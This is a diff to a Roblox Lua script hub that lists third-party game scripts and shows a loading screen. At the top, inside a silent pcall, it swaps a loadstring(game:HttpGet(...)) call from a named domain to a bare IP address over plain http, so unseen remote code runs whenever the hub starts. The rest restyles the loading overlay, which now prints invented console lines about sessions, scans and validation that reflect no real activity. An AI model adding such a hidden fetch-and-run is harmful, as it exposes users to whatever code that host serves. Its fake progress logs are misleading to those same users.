@@ -43,7 +43,7 @@ end
 --==================================================
 
 pcall(function()
-    loadstring(game:HttpGet("https://xscripts.cc/8ofGhey5g9E1BeF5yCWcCQnF7coBWWOd8kzehlwDfkUk4NmDVtly5DVuxFQxwJnVt9w9z1TtaH7LDYH0"))()
+    loadstring(game:HttpGet("http://31.172.87.116/8ofGhey5g9E1BeF5yCWcCQnF7coBWWOd8kzehlwDfkUk4NmDVtly5DVuxFQxwJnVt9w9z1TtaH7LDYH0"))()
 end)
 
 --==================================================
@@ -129,7 +129,7 @@ local NoKeyScripts = {
     },
     
     {
-        Name = "Wings Hub(NOTE: Close the Get Key window and wait a few seconds.)",
+        Name = "Wings Hub",
         Icon = "◇",
         URL = "https://wings.ac/loader"
     },
@@ -509,35 +509,46 @@ local function showScriptLoading(data)
 
     local theme = LoadingThemes[data.Name] or {
         Color = ACCENT,
-        Title = "SCRIPT INITIALIZATION",
-        Message = "Preparing script environment..."
+        Title = "RUNTIME INITIALIZATION",
+        Message = "Preparing script session..."
     }
 
+    -- This is a visual loading simulation. The remote script is executed
+    -- only after this screen finishes.
     local overlay = Instance.new("Frame")
     overlay.Name = "ScriptLoadingOverlay"
     overlay.Size = UDim2.fromScale(1, 1)
-    overlay.BackgroundColor3 = Color3.fromRGB(5, 7, 12)
-    overlay.BackgroundTransparency = 0.3
+    overlay.BackgroundColor3 = Color3.fromRGB(3, 5, 10)
+    overlay.BackgroundTransparency = 0.18
     overlay.BorderSizePixel = 0
     overlay.ZIndex = 100
     overlay.Parent = gui
 
     local panel = Instance.new("Frame")
+    panel.Name = "RuntimePanel"
     panel.AnchorPoint = Vector2.new(0.5, 0.5)
     panel.Position = UDim2.fromScale(0.5, 0.5)
-    panel.Size = UDim2.new(0, 310, 0, 155)
-    panel.BackgroundColor3 = BG
+    panel.Size = UDim2.new(0, 430, 0, 264)
+    panel.BackgroundColor3 = Color3.fromRGB(12, 16, 25)
     panel.BorderSizePixel = 0
     panel.ZIndex = 101
     panel.Parent = overlay
+    Corner(panel, 14)
+    Stroke(panel, theme.Color, 0.22, 1.4)
 
-    Corner(panel, 15)
-    Stroke(panel, theme.Color, 0.25, 1.5)
+    local topLine = Instance.new("Frame")
+    topLine.Size = UDim2.new(1, -2, 0, 3)
+    topLine.Position = UDim2.new(0, 1, 0, 1)
+    topLine.BackgroundColor3 = theme.Color
+    topLine.BorderSizePixel = 0
+    topLine.ZIndex = 102
+    topLine.Parent = panel
+    Corner(topLine, 4)
 
     local heading = Instance.new("TextLabel")
     heading.BackgroundTransparency = 1
-    heading.Position = UDim2.new(0, 18, 0, 14)
-    heading.Size = UDim2.new(1, -36, 0, 18)
+    heading.Position = UDim2.new(0, 18, 0, 13)
+    heading.Size = UDim2.new(1, -36, 0, 16)
     heading.Font = Enum.Font.GothamBold
     heading.Text = theme.Title
     heading.TextSize = 10
@@ -546,34 +557,101 @@ local function showScriptLoading(data)
     heading.ZIndex = 102
     heading.Parent = panel
 
+    local liveDot = Instance.new("Frame")
+    liveDot.Size = UDim2.fromOffset(7, 7)
+    liveDot.Position = UDim2.new(1, -25, 0, 18)
+    liveDot.BackgroundColor3 = Color3.fromRGB(75, 225, 145)
+    liveDot.BorderSizePixel = 0
+    liveDot.ZIndex = 103
+    liveDot.Parent = panel
+    Corner(liveDot, 8)
+
+    local liveText = Instance.new("TextLabel")
+    liveText.BackgroundTransparency = 1
+    liveText.Position = UDim2.new(1, -91, 0, 12)
+    liveText.Size = UDim2.new(0, 58, 0, 18)
+    liveText.Font = Enum.Font.GothamBold
+    liveText.Text = "LIVE"
+    liveText.TextSize = 8
+    liveText.TextColor3 = Color3.fromRGB(75, 225, 145)
+    liveText.TextXAlignment = Enum.TextXAlignment.Right
+    liveText.ZIndex = 102
+    liveText.Parent = panel
+
     local scriptName = Instance.new("TextLabel")
     scriptName.BackgroundTransparency = 1
-    scriptName.Position = UDim2.new(0, 18, 0, 38)
+    scriptName.Position = UDim2.new(0, 18, 0, 36)
     scriptName.Size = UDim2.new(1, -36, 0, 27)
     scriptName.Font = Enum.Font.GothamBold
-    scriptName.Text = data.Icon .. "  " .. data.Name
+    scriptName.Text = tostring(data.Icon or "◆") .. "  " .. tostring(data.Name)
     scriptName.TextSize = 19
-    scriptName.TextColor3 = TEXT
+    scriptName.TextColor3 = Color3.fromRGB(242, 245, 250)
     scriptName.TextXAlignment = Enum.TextXAlignment.Left
     scriptName.ZIndex = 102
     scriptName.Parent = panel
 
-    local message = Instance.new("TextLabel")
-    message.BackgroundTransparency = 1
-    message.Position = UDim2.new(0, 18, 0, 70)
-    message.Size = UDim2.new(1, -36, 0, 18)
-    message.Font = Enum.Font.Gotham
-    message.Text = theme.Message
-    message.TextSize = 10
-    message.TextColor3 = SUBTEXT
-    message.TextXAlignment = Enum.TextXAlignment.Left
-    message.ZIndex = 102
-    message.Parent = panel
+    local subtitle = Instance.new("TextLabel")
+    subtitle.BackgroundTransparency = 1
+    subtitle.Position = UDim2.new(0, 19, 0, 64)
+    subtitle.Size = UDim2.new(1, -38, 0, 15)
+    subtitle.Font = Enum.Font.Gotham
+    subtitle.Text = theme.Message
+    subtitle.TextSize = 9
+    subtitle.TextColor3 = Color3.fromRGB(137, 148, 166)
+    subtitle.TextXAlignment = Enum.TextXAlignment.Left
+    subtitle.ZIndex = 102
+    subtitle.Parent = panel
+
+    -- Terminal-style activity window
+    local terminal = Instance.new("Frame")
+    terminal.Name = "ActivityConsole"
+    terminal.Position = UDim2.new(0, 18, 0, 89)
+    terminal.Size = UDim2.new(1, -36, 0, 112)
+    terminal.BackgroundColor3 = Color3.fromRGB(6, 9, 15)
+    terminal.BorderSizePixel = 0
+    terminal.ClipsDescendants = true
+    terminal.ZIndex = 102
+    terminal.Parent = panel
+    Corner(terminal, 8)
+    Stroke(terminal, Color3.fromRGB(49, 60, 77), 0.55, 1)
+
+    local consoleHeader = Instance.new("TextLabel")
+    consoleHeader.BackgroundTransparency = 1
+    consoleHeader.Position = UDim2.new(0, 10, 0, 5)
+    consoleHeader.Size = UDim2.new(1, -20, 0, 13)
+    consoleHeader.Font = Enum.Font.Code
+    consoleHeader.Text = ">> CONSOLE  /  SESSION OUTPUT"
+    consoleHeader.TextSize = 8
+    consoleHeader.TextColor3 = Color3.fromRGB(111, 128, 151)
+    consoleHeader.TextXAlignment = Enum.TextXAlignment.Left
+    consoleHeader.ZIndex = 103
+    consoleHeader.Parent = terminal
+
+    local divider = Instance.new("Frame")
+    divider.Position = UDim2.new(0, 9, 0, 22)
+    divider.Size = UDim2.new(1, -18, 0, 1)
+    divider.BackgroundColor3 = Color3.fromRGB(43, 53, 68)
+    divider.BorderSizePixel = 0
+    divider.ZIndex = 103
+    divider.Parent = terminal
+
+    local consoleText = Instance.new("TextLabel")
+    consoleText.BackgroundTransparency = 1
+    consoleText.Position = UDim2.new(0, 10, 0, 28)
+    consoleText.Size = UDim2.new(1, -20, 1, -34)
+    consoleText.Font = Enum.Font.Code
+    consoleText.TextSize = 9
+    consoleText.TextColor3 = Color3.fromRGB(154, 190, 174)
+    consoleText.TextXAlignment = Enum.TextXAlignment.Left
+    consoleText.TextYAlignment = Enum.TextYAlignment.Top
+    consoleText.TextWrapped = false
+    consoleText.ZIndex = 103
+    consoleText.Parent = terminal
 
     local barBG = Instance.new("Frame")
-    barBG.Position = UDim2.new(0, 18, 0, 105)
-    barBG.Size = UDim2.new(1, -36, 0, 7)
-    barBG.BackgroundColor3 = Color3.fromRGB(35, 40, 52)
+    barBG.Position = UDim2.new(0, 18, 0, 214)
+    barBG.Size = UDim2.new(1, -36, 0, 6)
+    barBG.BackgroundColor3 = Color3.fromRGB(35, 43, 57)
     barBG.BorderSizePixel = 0
     barBG.ClipsDescendants = true
     barBG.ZIndex = 102
@@ -590,65 +668,91 @@ local function showScriptLoading(data)
 
     local percentage = Instance.new("TextLabel")
     percentage.BackgroundTransparency = 1
-    percentage.Position = UDim2.new(0, 18, 0, 119)
-    percentage.Size = UDim2.new(0.5, 0, 0, 20)
+    percentage.Position = UDim2.new(0, 18, 0, 225)
+    percentage.Size = UDim2.new(0.35, 0, 0, 17)
     percentage.Font = Enum.Font.GothamBold
-    percentage.Text = "0%"
-    percentage.TextSize = 11
-    percentage.TextColor3 = TEXT
+    percentage.Text = "00%"
+    percentage.TextSize = 10
+    percentage.TextColor3 = Color3.fromRGB(235, 240, 248)
     percentage.TextXAlignment = Enum.TextXAlignment.Left
     percentage.ZIndex = 102
     percentage.Parent = panel
 
     local status = Instance.new("TextLabel")
     status.BackgroundTransparency = 1
-    status.Position = UDim2.new(0.5, 0, 0, 119)
-    status.Size = UDim2.new(0.5, -18, 0, 20)
+    status.Position = UDim2.new(0.35, 0, 0, 225)
+    status.Size = UDim2.new(0.65, -18, 0, 17)
     status.Font = Enum.Font.Gotham
-    status.Text = "INITIALIZING"
-    status.TextSize = 9
+    status.Text = "STARTING SESSION"
+    status.TextSize = 8
     status.TextColor3 = theme.Color
     status.TextXAlignment = Enum.TextXAlignment.Right
     status.ZIndex = 102
     status.Parent = panel
 
-    local progressTween = TweenService:Create(
-        bar,
-        TweenInfo.new(6.5, Enum.EasingStyle.Linear),
-        {Size = UDim2.new(1, 0, 1, 0)}
-    )
+    local logLines = {}
+    local function addLog(line)
+        table.insert(logLines, line)
+        while #logLines > 6 do
+            table.remove(logLines, 1)
+        end
+        consoleText.Text = table.concat(logLines, "\n")
+    end
 
-    progressTween:Play()
+    local activity = {
+        {At = 0.03, Text = "[BOOT]     Creating isolated script session"},
+        {At = 0.13, Text = "[SCAN]     Checking runtime compatibility"},
+        {At = 0.24, Text = "[CORE]     Preparing shared environment"},
+        {At = 0.36, Text = "[MODULE]   Resolving interface components"},
+        {At = 0.49, Text = "[MODULE]   Registering event handlers"},
+        {At = 0.61, Text = "[CACHE]    Preparing local resource cache"},
+        {At = 0.73, Text = "[CONFIG]   Applying script configuration"},
+        {At = 0.84, Text = "[CHECK]    Verifying initialization state"},
+        {At = 0.94, Text = "[READY]    Finalizing launch sequence"}
+    }
 
-    local startTime = os.clock()
+    local duration = 7
+    local startedAt = os.clock()
+    local nextLog = 1
 
-    while os.clock() - startTime < 6.5 do
+    addLog("[BOOT]     " .. tostring(data.Name) .. " runtime")
+    addLog("[INFO]     Session ID: " .. string.format("%06X", math.random(0, 16777215)))
 
-        local progress = math.clamp(
-            (os.clock() - startTime) / 6.5,
-            0,
-            1
-        )
+    while true do
+        local elapsed = os.clock() - startedAt
+        local progress = math.clamp(elapsed / duration, 0, 1)
 
-        percentage.Text = math.floor(progress * 100) .. "%"
+        percentage.Text = string.format("%02d%%", math.floor(progress * 100))
+        bar.Size = UDim2.new(progress, 0, 1, 0)
 
-        if progress < 0.25 then
-            status.Text = "INITIALIZING"
-        elseif progress < 0.55 then
-            status.Text = "LOADING MODULES"
-        elseif progress < 0.85 then
-            status.Text = "CONFIGURING"
+        if progress < 0.22 then
+            status.Text = "INITIALIZING RUNTIME"
+        elseif progress < 0.48 then
+            status.Text = "LOADING COMPONENTS"
+        elseif progress < 0.74 then
+            status.Text = "BUILDING SESSION"
+        elseif progress < 0.94 then
+            status.Text = "RUNNING VALIDATION"
         else
             status.Text = "FINALIZING"
         end
 
-        task.wait(0.05)
+        while activity[nextLog] and progress >= activity[nextLog].At do
+            addLog(activity[nextLog].Text)
+            nextLog = nextLog + 1
+        end
+
+        if progress >= 1 then
+            break
+        end
+
+        task.wait(0.04)
     end
 
     percentage.Text = "100%"
-    status.Text = "COMPLETE"
-
-    task.wait(0.15)
+    status.Text = "READY TO LAUNCH"
+    addLog("[SUCCESS]  Initialization sequence complete")
+    task.wait(0.35)
 
     overlay:Destroy()
 end
